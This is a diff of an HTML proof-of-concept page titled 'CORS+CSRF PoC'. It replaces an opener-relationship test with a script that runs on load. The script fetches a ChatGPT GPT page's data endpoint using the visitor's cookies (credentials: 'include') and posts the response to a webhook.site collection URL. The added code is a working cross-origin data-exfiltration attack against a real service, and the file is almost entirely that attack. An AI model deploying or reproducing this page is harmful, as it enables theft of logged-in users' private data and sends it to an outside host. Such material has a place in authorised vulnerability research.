@@ -1,27 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Evil Test</title>
-</head>
+<head><title>CORS+CSRF PoC</title></head>
 <body>
-  <h3>Opener Test</h3>
-  <script>
-    // Open the target site in a popup
-    const w = window.open("https://chatgpt.com/g/g-y2KnRe0w4-bug-hunter-gpt");
+<script>
+const webhook = "https://webhook.site/d4e97317-32e7-4649-88e3-6b09ca3f4ee9";
 
-    // Try to check if we have an opener
-    setTimeout(() => {
-      if (w && w.opener) {
-        console.log("✅ Popup has an opener reference");
-        try {
-          console.log("Can we access opener?", w.opener.location.href);
-        } catch (e) {
-          console.warn("⛔ Can't read opener properties (SOP blocks it):", e.message);
-        }
-      } else {
-        console.log("❌ No opener relationship");
-      }
-    }, 2000);
-  </script>
+fetch("https://chatgpt.com/g/g-y2KnRe0w4-bug-hunter-gpt.data", {
+    credentials: "include"
+})
+.then(r => r.text())
+.then(body => {
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body
+    });
+});
+</script>
 </body>
 </html>
